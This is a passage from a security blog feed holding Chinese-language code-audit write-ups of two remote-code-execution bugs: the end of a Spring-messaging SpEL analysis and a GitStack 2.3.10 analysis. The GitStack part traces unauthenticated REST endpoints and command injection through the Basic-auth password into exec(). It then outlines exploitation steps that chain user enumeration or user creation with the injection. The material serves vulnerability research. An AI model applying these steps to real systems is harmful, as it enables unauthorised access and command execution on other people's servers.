<p>该变量即 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:201行的filterSubscriptions方法的<code>allMatches</code>变量，跟进至两层for循环<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (String sessionId : allMatches.keySet()) &#123;</div><div class="line">    <span class="keyword">for</span> (String subId : allMatches.get(sessionId)) &#123;</div><div class="line">        SessionSubscriptionInfo info = <span class="keyword">this</span>.subscriptionRegistry.getSubscriptions(sessionId);</div><div class="line">        <span class="keyword">if</span> (info == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        Subscription sub = info.getSubscription(subId);</div><div class="line">        <span class="keyword">if</span> (sub == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过两次<code>getSubscriptions</code>操作，此时取出了先前的配置信息，sub变量值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/7.jpg?raw=true" alt=""></p>
<p>接下去第 207 行将selector表达式取出：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Expression expression = sub.getSelectorExpression();</div></pre></td></tr></table></figure></p>
<p>第217行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">if</span> (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123;</div><div class="line">        result.add(sessionId, subId);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过调用了<code>expression.getValue(context, Boolean.class)</code>，触发payload，执行了spel表达式，远程命令执行成功。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/8.jpg?raw=true" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://github.com/spring-guides/gs-messaging-stomp-websocket" target="_blank" rel="external">spring-guides/gs-messaging-stomp-websocket</a></li>
<li><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#websocket-stomp" target="_blank" rel="external">spring-framework-reference: websocket-stomp</a></li>
<li><a href="https://blog.csdn.net/pacosonswjtu/article/details/51914567" target="_blank" rel="external">springmvc(18)使用WebSocket 和 STOMP 实现消息功能</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2252&quot;&gt;spring-messaging Remote Code Execution 分析-【CVE-2018-1270】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>GitStack &lt;= 2.3.10 远程命令执行漏洞分析-【CVE-2018-5955】</title>
    <link href="http://chybeta.github.io/2018/03/30/GitStack-2-3-10-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-5955%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/03/30/GitStack-2-3-10-远程命令执行漏洞分析-【CVE-2018-5955】/</id>
    <published>2018-03-30T10:37:23.000Z</published>
    <updated>2018-03-31T00:36:34.004Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2235" target="_blank" rel="external">GitStack &lt;= 2.3.10 远程命令执行漏洞分析-【CVE-2018-5955】</a><br><a id="more"></a></p>
<h1 id="GitStack"><a href="#GitStack" class="headerlink" title="GitStack"></a>GitStack</h1><p>GitStack是一款win平台下的Git可视化平台。其最新版本2.3.10存在一个远程命令执行漏洞(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5955" target="_blank" rel="external">CVE-2018-5955</a>)，对应下载地址： <a href="https://gitstack.com/download/" target="_blank" rel="external">https://gitstack.com/download/</a> 。</p>
<p>安装完成后，登陆入口在 <a href="http://192.168.248.130/registration/login/?next=/gitstack/" target="_blank" rel="external">http://192.168.248.130/registration/login/?next=/gitstack/</a> 。默认用户名/密码分别为： admin/admin</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="一些“小”漏洞"><a href="#一些“小”漏洞" class="headerlink" title="一些“小”漏洞"></a>一些“小”漏洞</h2><p><code>views.py</code>中的问题太多了，为后续的命令执行利用，这里仅列一些。目测开发者在开发的时候想这些接口开放着也没关系。。</p>
<h3 id="用户相关rest-user"><a href="#用户相关rest-user" class="headerlink" title="用户相关rest_user"></a>用户相关rest_user</h3><p>首先在<code>app/rest/views.py</code>中定义了<code>rest_user</code>方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@csrf_exempt</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rest_user</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># create user</span></div><div class="line">        <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">            username = request.POST[<span class="string">'username'</span>]</div><div class="line">            password = request.POST[<span class="string">'password'</span>]</div><div class="line">            </div><div class="line">            <span class="comment"># get the username/password from the request</span></div><div class="line">            <span class="comment"># check the username</span></div><div class="line">            matcher = re.compile(<span class="string">"^[A-Za-z]\w&#123;2,&#125;$"</span>)</div><div class="line">            <span class="keyword">if</span> matcher.match(username) <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Please enter an alphanumeric name without spaces"</span>)</div><div class="line">            <span class="keyword">if</span>(username == <span class="string">""</span>):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Please enter a non empty name"</span>)</div><div class="line">            </div><div class="line">            user = UserFactory.instantiate_user(username, password)</div><div class="line">            user.create()</div><div class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">"User created"</span>)</div><div class="line">        <span class="comment"># get retrieve_all the users</span></div><div class="line">        <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</div><div class="line">            <span class="comment"># convert list of objects to list of strings</span></div><div class="line">            user_list_str = []</div><div class="line">            user_list_obj = UserFactory.instantiate_user(<span class="string">''</span>).retrieve_all()</div><div class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> user_list_obj:   </div><div class="line">                user_list_str.append(user.username)</div><div class="line">            json_reply = json.dumps(user_list_str)</div><div class="line">            <span class="keyword">return</span> HttpResponse(json_reply)</div><div class="line">        <span class="comment"># update the user</span></div><div class="line">        <span class="keyword">if</span> request.method == <span class="string">'PUT'</span>:</div><div class="line">            <span class="comment"># retrieve the credentials from the json</span></div><div class="line">            credentials = json.loads(request.raw_post_data)</div><div class="line">            <span class="comment"># create an instance of the user and update it</span></div><div class="line">            user = UserFactory.instantiate_user(credentials[<span class="string">'username'</span>], credentials[<span class="string">'password'</span>])</div><div class="line">            user.update()</div><div class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">"User successfully updated"</span>)</div><div class="line">        </div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">return</span> HttpResponseServerError(e)</div></pre></td></tr></table></figure></p>
<p>在默认情况下：</p>
<ol>
<li><p>使用GET方式可以直接查看GitStack仓库的用户列表，存在未授权访问信息泄露漏洞<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/2.jpg?raw=true" alt=""></p>
</li>
<li><p>通过POST方法，指定username和password可以直接添加仓库用户，存在任意用户添加漏洞：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/3.jpg?raw=true" alt=""></p>
</li>
<li><p>通过PUT方法，以JSON格式即可重置任意用户密码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/6.jpg?raw=true" alt=""></p>
</li>
</ol>
<h3 id="project相关"><a href="#project相关" class="headerlink" title="project相关"></a>project相关</h3><h4 id="任意创建repo"><a href="#任意创建repo" class="headerlink" title="任意创建repo"></a>任意创建repo</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># create a repository</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rest_repository</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="comment"># Add new repository</span></div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">        name=request.POST[<span class="string">'name'</span>]</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="comment"># check the repo name</span></div><div class="line">            matcher = re.compile(<span class="string">"^\w&#123;1,&#125;$"</span>)</div><div class="line">            <span class="keyword">if</span> matcher.match(name) <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Please enter an alphanumeric name without spaces"</span>)</div><div class="line">            <span class="keyword">if</span>(name == <span class="string">""</span>):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Please enter a non empty name"</span>)</div><div class="line">            <span class="comment"># create the repo</span></div><div class="line">            repository = Repository(name)</div><div class="line">            repository.create()</div><div class="line">    ....</div></pre></td></tr></table></figure>
<p>直接POST一个name即可创建对应的project，不过在POST的时候需要带上CSRF_TOKEN<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/7.jpg?raw=true" alt=""></p>
<p>CSRF_TOKEN的获得如下，访问登陆页面，比如 <a href="http://192.168.248.130/registration/login/?next=/gitstack/" target="_blank" rel="external">http://192.168.248.130/registration/login/?next=/gitstack/</a> ，查看源代码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/10.jpg?raw=true" alt=""></p>
<h4 id="任意repo添加user"><a href="#任意repo添加user" class="headerlink" title="任意repo添加user"></a>任意repo添加user</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@csrf_exempt</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rest_repo_user</span><span class="params">(request, repo_name, username)</span>:</span></div><div class="line">    repo = Repository(repo_name)</div><div class="line">    user = UserFactory.instantiate_user(username)</div><div class="line"></div><div class="line">    <span class="comment"># Add user</span></div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="comment"># Get the repository and add the user</span></div><div class="line">            repo.add_user(user)</div><div class="line">            repo.add_user_read(user)</div><div class="line">            repo.add_user_write(user)</div><div class="line">            repo.save()</div><div class="line">            <span class="keyword">return</span> HttpResponse(<span class="string">"User "</span> + username + <span class="string">" added to "</span> + repo_name)</div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>按照下面这个格式即可添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">POST http://xx/rest/repository/项目名/user/用户名/</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/11.jpg?raw=true" alt=""></p>
<h2 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h2><p>默认情况下GitStack的<code>Web Interface</code>接口时开启的。访问<code>http://xx/web/index.php</code>也即访问<code>gitphp</code>目录下的index.php.</p>
<p>第 153 行进行了认证操作：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Authentification</div><div class="line">	 */</div><div class="line">    $auth = <span class="keyword">new</span> GitPHP_Authentication();</div><div class="line">    $auth-&gt;authenticate();</div><div class="line">    ... </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>GitPHP_Authentication</code>定义在<code>gitphp/include/Authentication.class.php</code>中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">GitPHP_Authentication</span></span></div><div class="line">&#123;</div><div class="line">    ....</div><div class="line"></div><div class="line">	<span class="comment">// Authenticate the user</span></div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span><span class="params">()</span></span></div><div class="line">	&#123;</div><div class="line">		</div><div class="line">		<span class="comment">// Get the project name</span></div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</div><div class="line"></div><div class="line">			<span class="comment">//$this-&gt;project_name = substr($_GET['p'], 0, -1);</span></div><div class="line">			<span class="keyword">$this</span>-&gt;project_name = $_GET[<span class="string">'p'</span>];</div><div class="line">			</div><div class="line">			<span class="comment">// Read the users of the project</span></div><div class="line">			$users = <span class="keyword">$this</span>-&gt;readRepositoryReadUsers();</div><div class="line">			<span class="comment">// check if the user everyone is in the list</span></div><div class="line">			<span class="keyword">if</span>(in_array(<span class="string">'everyone'</span>, $users))</div><div class="line">			&#123;</div><div class="line">				<span class="comment">// yes</span></div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>; <span class="comment">// the user do not need to be authenticated</span></div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span></div><div class="line">			&#123;</div><div class="line">				</div><div class="line">				<span class="comment">// The user should be authenticated</span></div><div class="line">				<span class="comment">// Ask for username/password</span></div><div class="line">				<span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'PHP_AUTH_USER'</span>])) &#123;</div><div class="line"></div><div class="line">					header(<span class="string">'WWW-Authenticate: Basic realm="Enter a username/password of a user which has the rights to access to this repository. ADMIN PASSWORD WON\'T WORK"'</span>);</div><div class="line">					header(<span class="string">'HTTP/1.0 401 Unauthorized'</span>);</div><div class="line">					<span class="keyword">echo</span> <span class="string">'xxx省略'</span>;</div><div class="line">					<span class="keyword">exit</span>;</div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">					<span class="comment">// try to authenticate</span></div><div class="line">					$authenticated = <span class="keyword">false</span>;</div><div class="line">					$username = $_SERVER[<span class="string">'PHP_AUTH_USER'</span>];</div><div class="line">					$password = $_SERVER[<span class="string">'PHP_AUTH_PW'</span>];</div><div class="line">					</div><div class="line">					<span class="comment">// Check if the user is in the array of read users</span></div><div class="line">					<span class="keyword">if</span>(in_array($username, $users))&#123;</div><div class="line">						$authMethod = <span class="keyword">$this</span>-&gt;getAuthMethod();</div><div class="line">						<span class="comment">// authenticate with ldap or by file</span></div><div class="line">						<span class="keyword">if</span>($authMethod == <span class="string">"file"</span>)&#123;</div><div class="line">							$authenticated = <span class="keyword">$this</span>-&gt;authenticateFile($username, $password);</div><div class="line">						&#125; <span class="keyword">if</span>($authMethod == <span class="string">"ldap"</span>) &#123;</div><div class="line">							$authenticated = <span class="keyword">$this</span>-&gt;authenticateLdap($username, $password);</div><div class="line"></div><div class="line">						&#125;</div><div class="line">						<span class="keyword">if</span> ($authenticated == <span class="keyword">false</span>)&#123;</div><div class="line">							<span class="keyword">$this</span>-&gt;denyAuthentication();</div><div class="line">						&#125;</div><div class="line">					&#125; <span class="keyword">else</span> &#123;</div><div class="line">						</div><div class="line">						<span class="keyword">$this</span>-&gt;denyAuthentication();</div><div class="line">					&#125;</div><div class="line">					</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>当访问<code>index.php</code>时指定了参数p，也即<code>project_name</code>，会通过<code>$this-&gt;readRepositoryReadUsers()</code>将该project对应的user提取出来。倘若该project并非公开，即<code>everyone</code>并不在<code>$users</code>中，则进入<code>authenticated</code>阶段。</p>
<p>可以看到，在这部分的认证中，采用了<code>HTTP Basic Authentication</code>的方式<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/5.jpg?raw=true" alt=""></p>
<p>根据<a href="http://php.net/manual/zh/features.http-auth.php" target="_blank" rel="external">php手册</a>,当PHP以Apache模块方式运行时可以用 header()函数来向客户端浏览器发送认证请求信息。而当用户输入用户名和密码后，包含有URL的PHP脚本将会把变量<code>PHP_AUTH_USER</code>,<code>PHP_AUTH_PW</code>和<code>AUTH_TYPE</code>分别被设定为用户名，密码和认证类型。也就是说，这里的<code>username</code>与<code>password</code>即我们可控，且未加以过滤的变量：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$username = $_SERVER[<span class="string">'PHP_AUTH_USER'</span>];</div><div class="line">$password = $_SERVER[<span class="string">'PHP_AUTH_PW'</span>];</div></pre></td></tr></table></figure></p>
<p>在确认输入的用户名(<code>$username</code>)在project的用户列表后，开始进行真正的认证操作。首先是获取认证类型<code>$authMethod = $this-&gt;getAuthMethod();</code>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getAuthMethod</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="comment">// Read the gitstack settings file</span></div><div class="line">		$settingsDir = GitPHP_Config::GetInstance()-&gt;GetValue(<span class="string">'gitstacksettings'</span>, <span class="string">''</span>);</div><div class="line"></div><div class="line">		<span class="comment">// read the ini file</span></div><div class="line">		$ini_array = parse_ini_file($settingsDir, <span class="keyword">true</span>, INI_SCANNER_RAW);</div><div class="line">		$authMethod = $ini_array[<span class="string">'authentication'</span>][<span class="string">'authmethod'</span>];</div><div class="line">		<span class="comment">// should contain "ldap" or "file"</span></div><div class="line">		<span class="keyword">return</span> $authMethod;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>gitstacksettings</code>的默认值在<code>data/settings.ini</code>中设定，其中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[authentication]</div><div class="line">authmethod = file</div><div class="line">ldapprotocol =</div></pre></td></tr></table></figure></p>
<p>也即在默认情况下采用的是<code>file</code>方式的认证方法，程序流程进入：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span>($authMethod == <span class="string">"file"</span>)&#123;</div><div class="line">        $authenticated = <span class="keyword">$this</span>-&gt;authenticateFile($username, $password);</div><div class="line">    &#125; </div><div class="line">```                        </div><div class="line"></div><div class="line">`authenticateFile`定义在`gitphp/<span class="keyword">include</span>/Authentication.class.php`第<span class="number">182</span>行：</div><div class="line">```php </div><div class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticateFile</span><span class="params">($username, $password)</span></span>&#123;</div><div class="line">		$authenticated = <span class="keyword">false</span>;</div><div class="line">		<span class="comment">// Will contains username as key, salt and encrypted pass as value</span></div><div class="line">		$userInfos = <span class="keyword">Array</span>();</div><div class="line">		<span class="comment">// exec the open ssl command</span></div><div class="line">		$installDir = GitPHP_Config::GetInstance()-&gt;GetValue(<span class="string">'gitstackinstalldir'</span>, <span class="string">''</span>);	</div><div class="line">		$lines = file($installDir . <span class="string">"/data/passwdfile"</span>);</div><div class="line">		<span class="comment">// Fill the userInfos array</span></div><div class="line">		<span class="keyword">foreach</span>($lines <span class="keyword">as</span> $line)</div><div class="line">		&#123;</div><div class="line">			。。。省略	</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		<span class="comment">// if the user exist in the array</span></div><div class="line">		<span class="keyword">if</span>(array_key_exists($username, $userInfos))&#123;</div><div class="line">			<span class="comment">// run the openssl command to verify the password</span></div><div class="line">			$currentUser = $userInfos[$username];</div><div class="line">			$result = exec($installDir . <span class="string">'/apache/bin/openssl.exe passwd -apr1 -salt '</span> . $currentUser[<span class="string">'salt'</span>] . <span class="string">" "</span> . $password);</div><div class="line">			<span class="comment">// result = $apr1$v1Ds2Lf9$hNL6r81eGFXrUmh5wbQpn0</span></div><div class="line">			<span class="comment">// split the result to get only the encrypted password part</span></div><div class="line">			$split = explode(<span class="string">'$'</span>, $result);</div><div class="line">			$encryptedPassword = $split[<span class="number">3</span>];</div><div class="line">			<span class="keyword">if</span>($encryptedPassword == $currentUser[<span class="string">'encryptedPass'</span>])</div><div class="line">				$authenticated = <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> $authenticated;	</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>此处的流程就是将project的用户信息从<code>/data/passwdfile</code>读出，经过一定的处理，然后通过openssl来进行响应的验证。注意这里的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$result = exec($installDir . <span class="string">'/apache/bin/openssl.exe passwd -apr1 -salt '</span> . $currentUser[<span class="string">'salt'</span>] . <span class="string">" "</span> . $password);</div></pre></td></tr></table></figure></p>
<p>我们传入的<code>$password</code>直接拼接到了语句中，然后exec执行，这里即存在命令执行漏洞，且由于并不需要认证成功。</p>
<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>不过这里的任意命令执行漏洞有一些限制，它需要在进行<code>HTTP Basic Authentication</code>时在用户名处填入project的用户列表中的某一个，然后通过在密码处注入payload，才能到达<code>exec</code>处。因此结合前面第一部分的未授权访问/任意添加用户等等漏洞，可以梳理如下两种方法：</p>
<ol>
<li><p>通过<code>GET /rest/user</code>获取到所有的用户列表，然后直接进行爆破，总有某些用户是属于选择的project的用户列表中的。脚本如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180330/12.jpg?raw=true" alt=""></p>
</li>
<li><p>通过<code>POST /rest/user</code>添加用户x，接着创建repo，将用户x加入到repo中，然后基于用户x的认证来进行rce。第二种方法的脚本见 <a href="https://blogs.securiteam.com/index.php/archives/3557" target="_blank" rel="external">https://blogs.securiteam.com/index.php/archives/3557</a> ，不搬运了。</p>
</li>
</ol>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://blogs.securiteam.com/index.php/archives/3557" target="_blank" rel="external">SSD Advisory – GitStack Unauthenticated Remote Code Execution</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2235&quot;&gt;GitStack &amp;lt;= 2.3.10 远程命令执行漏洞分析-【CVE-2018-5955】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="gitstack" scheme="http://chybeta.github.io/tags/gitstack/"/>
    
  </entry>
  
</feed>
